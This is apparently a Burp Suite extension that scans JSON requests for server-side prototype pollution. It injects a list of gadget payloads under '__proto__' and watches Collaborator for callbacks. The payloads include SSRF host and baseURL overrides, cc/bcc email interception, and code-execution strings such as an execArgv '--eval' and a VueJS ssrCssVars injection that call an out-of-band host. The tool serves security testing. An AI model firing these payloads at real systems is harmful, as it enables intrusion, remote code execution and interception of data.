# -*- coding: utf-8 -*-

import json
import time
import copy
import base64
from threading import Thread
from burp import IBurpExtender
from burp import IContextMenuFactory
from burp import IScanIssue
from javax.swing import JMenuItem
from java.util import ArrayList
from javax.swing import SwingWorker

gadgets = [
    {
        "payload": {"baseURL": "https://<URL>"},
        "description": "Gadget for modifying 'baseURL', which can lead to Server-Side Request Forgery (SSRF) or exposure of sensitive API keys in libraries like Axios.",
        "null_payload": {"baseURL": {}}
    },
    {
        "payload": {"baseurl": "https://<URL>"},
        "description": "Gadget for modifying 'baseurl', which can lead to Server-Side Request Forgery (SSRF) or exposure of sensitive API keys in libraries like Axios.",
        "null_payload": {"baseurl": {}}
    },
    {
        "payload": {"proxy": {"protocol": "http", "host": "<URL>", "port": 80}},
        "description": "Gadget for setting a proxy, which can be used to manipulate or intercept HTTP requests, potentially revealing sensitive information.",
        "null_payload": {"proxy": {}}
    },
    {
        "payload": {"cc": "email@<URL>"},
        "description": "Gadget for adding a CC address in email libraries, which could be exploited to intercept all emails sent by the platform.",
        "null_payload": {"cc": {}}
    },
    {
        "payload": {"cco": "email@<URL>"},
        "description": "Gadget for adding a BCC address in email libraries, similar to 'cc', for intercepting emails.",
        "null_payload": {"cco": {}}
    },    
    {
        "payload": {"bcc": "email@<URL>"},
        "description": "Gadget for adding a BCC address in email libraries, similar to 'cc', for intercepting emails.",
        "null_payload": {"bcc": {}}
    },
    {
        "payload": {"execArgv": ["--eval=require('http').get('http://<URL>');"]},
        "description": "Gadget for executing arbitrary commands via 'child_process', potentially leading to Remote Code Execution (RCE).",
        "null_payload": {"execArgv": None}
    },
    {
        "payload": {"shell": "vim", "input": ":! ping <URL>\n"},
        "description": "Gadget for executing arbitrary commands via 'child_process', potentially leading to Remote Code Execution (RCE).",
        "null_payload": {"shell": {}, "input": {}}
    },
    {
        "payload": {"ssrCssVars": "1};process.mainModule.require('http').get('http://<URL>');//"},
        "description": "Gadget for exploiting 'ssrCssVars' in VueJS ^3.2.47, allowing arbitrary code execution through a call to Function. This vulnerability can be used to execute arbitrary commands on the server. More information about exploitation: https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit",
        "null_payload": {"ssrCssVars": {}}
    },
    {
        "payload": {"host": "<URL>"},
        "description": "Gadget for exploiting Got ^11.8.3 by modifying request properties to perform SSRF. More information about exploitation: https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit",
        "null_payload": {"host": {}}
    },
    {
        "payload": {"hostname": "<URL>"},
        "description": "Gadget for modifying 'hostname', which can lead to Server-Side Request Forgery (SSRF) or exposure of sensitive API keys in HTTP libraries.",
        "null_payload": {"hostname": {}}
    },
]

class PollingThread(Thread):
    def __init__(self, collaborator_context, collaborator_url, callback):
        Thread.__init__(self)
        self.collaborator_context = collaborator_context
        self.collaborator_url = collaborator_url
        self.callback = callback
        self._running = True

    def run(self):
        while self._running:
            try:
                interactions = self.collaborator_context.fetchCollaboratorInteractionsFor(self.collaborator_url)
                if interactions:
                    self.callback(interactions)
                    self._running = False
            except Exception as e:
                print("Error obtaining interactions: {}".format(e))
                self._running = False
            time.sleep(10)


    def stop(self):
        self._running = False

class ScanWorker(SwingWorker):
    def __init__(self, extender, traffic):
        self.extender = extender
        self.traffic = traffic

    def create_modified_request(self, traffic, new_body):
        request_info = self.extender._helpers.analyzeRequest(traffic)
        headers = list(request_info.getHeaders()) 

        content_length_index = -1
        for i, header in enumerate(headers):
            if header.startswith("Content-Length:"):
                content_length_index = i
                break

        if content_length_index != -1:
            headers[content_length_index] = "Content-Length: " + str(len(new_body))

        new_body_bytes = self.extender._helpers.stringToBytes(new_body)

        new_request = self.extender._helpers.buildHttpMessage(headers, new_body_bytes)

        return new_request


    def doInBackground(self):
        request_info = self.extender._helpers.analyzeRequest(self.traffic)
        headers = request_info.getHeaders()

        is_json = any("Content-Type: application/json" in header for header in headers)

        if is_json:
            body_bytes = self.traffic.getRequest()[request_info.getBodyOffset():]
            body_str = self.extender._helpers.bytesToString(body_bytes)

            try:
                json_body = json.loads(body_str)
            except json.JSONDecodeError as e:
                print("Error decoding JSON:", e)
                return None
            
            collaborator_context = self.extender._callbacks.createBurpCollaboratorClientContext()
            
            self.modify_and_send_requests(json_body, collaborator_context)

        return None
    
    def modify_and_send_requests(self, data, collaborator_context, path=[]):

        collaborator_url = collaborator_context.generatePayload(True)

        for gadget in gadgets:
            modified_data = copy.deepcopy(data)
            null_modified_data = copy.deepcopy(data)
            current_level = modified_data
            null_current_level = null_modified_data

            for key in path:
                if isinstance(current_level, dict) and key in current_level:
                    current_level = current_level[key]
                    null_current_level = null_current_level[key]
                elif isinstance(current_level, list) and isinstance(key, int) and key < len(current_level):
                    current_level = current_level[key]
                    null_current_level = null_current_level[key]
                else:
                    return
            collaborator_url = collaborator_context.generatePayload(True)
            payload = json.loads(json.dumps(gadget["payload"]).replace("<URL>", collaborator_url))

            if isinstance(current_level, dict):
                current_level["__proto__"] = payload
                null_current_level["__proto__"] = gadget["null_payload"]
            elif isinstance(current_level, list):
                current_level.append({"__proto__": payload})
                null_current_level.append({"__proto__": gadget["null_payload"]})
            else:
                parent_level = modified_data
                null_parent_level = null_modified_data
                for key in path[:-1]:
                    parent_level = parent_level[key] if key in parent_level else None
                if parent_level is not None and path:
                    parent_level[path[-1]] = {"__proto__": payload}
                    null_parent_level[path[-1]] = {"__proto__": gadget["null_payload"]}

            self.send_request_and_start_polling(modified_data, null_modified_data, collaborator_context, collaborator_url, gadget["description"])
    
        original_level = data
        for key in path:
            if isinstance(original_level, dict) and key in original_level:
                original_level = original_level[key]
            elif isinstance(original_level, list) and isinstance(key, int) and key < len(original_level):
                original_level = original_level[key]
            else:
                return

        if isinstance(original_level, dict):
            for key in original_level.keys():
                self.modify_and_send_requests(data, collaborator_context, path + [key])

        elif isinstance(original_level, list):
            for i in range(len(original_level)):
                self.modify_and_send_requests(data, collaborator_context, path + [i])

    def send_request_and_start_polling(self, modified_data, null_modified_data, collaborator_context, collaborator_url, gadget_description):
        modified_request = self.create_modified_request(self.traffic, json.dumps(modified_data))
        null_modified_request = self.create_modified_request(self.traffic, json.dumps(null_modified_data))
        modified_request_response = self.extender._callbacks.makeHttpRequest(self.traffic.getHttpService(), modified_request)
        polling_thread = PollingThread(collaborator_context, collaborator_url, lambda interactions: self.handle_collaborator_interaction(interactions, modified_request_response, gadget_description, null_modified_request))
        polling_thread.start()

    def handle_collaborator_interaction(self, interactions, modified_request_response, gadget_description, null_modified_request):
        issueDescription = (
            "Prototype Pollution is a security vulnerability that occurs when an "
            "attacker is able to modify a JavaScript application's prototype object. "
            "It can lead to various security issues, including unauthorized access, "
            "information disclosure, and remote code execution."
            "<br><br><b>Gadget Found Details:</b><br><br>" + gadget_description
        )

        if interactions:

            self.extender._callbacks.makeHttpRequest(self.traffic.getHttpService(), null_modified_request)

            interaction_details = "<br><br><b>Collaborator Interactions:</b><br><br>"
            for interaction in interactions:
                interaction_type = interaction.getProperty("type")
                client_ip = interaction.getProperty("client_ip")
                time_stamp = interaction.getProperty("time_stamp")
                request_encoded = interaction.getProperty("request") if interaction.getProperty("request") else None
                conversation_encoded = interaction.getProperty("conversation") if interaction.getProperty("conversation") else None

                interaction_detail = "<b>Type:</b> {}, <b>IP:</b> {}, <b>Timestamp:</b> {}<br>".format(interaction_type, client_ip, time_stamp)
                if request_encoded:
                    request_decoded = base64.b64decode(request_encoded).decode('utf-8')
                    interaction_detail += "<b>Request:</b><br>{}<br><br>".format(request_decoded)
                interaction_details += interaction_detail

                if conversation_encoded:
                    conversation_decoded = base64.b64decode(conversation_encoded).decode('utf-8')
                    interaction_detail += "<b>Message:</b><br>{}<br><br>".format(conversation_decoded)
                interaction_details += interaction_detail


            issueDescription += interaction_details

            issue = CustomScanIssue(
                self.traffic.getHttpService(),
                self.extender._helpers.analyzeRequest(self.traffic).getUrl(),
                [modified_request_response], 
                "Prototype Pollution Gadget Found",
                issueDescription,
                "High",
                "Certain",
                None,
            )
            self.extender._callbacks.addScanIssue(issue)





class BurpExtender(IBurpExtender, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Prototype Pollution Gadgets Finder")
        self._callbacks.registerContextMenuFactory(self)
        return

    def createMenuItems(self, invocation):
        self._context = invocation
        menu_list = ArrayList() 
        menu_item = JMenuItem("Scan Gadgets", actionPerformed=self.scan_item)
        menu_list.add(menu_item)
        return menu_list

    def scan_item(self, event):
        http_traffic = self._context.getSelectedMessages()
        for traffic in http_traffic:
            worker = ScanWorker(self, traffic)
            worker.execute()



class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence, remediation):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence
        self._remediation = remediation

    def getHttpService(self):
        return self._httpService

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueDetail(self):
        return self._detail

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getRemediationDetail(self):
        return self._remediation

    def getHttpMessages(self):
        return self._httpMessages

    def getMarkers(self):
        return None
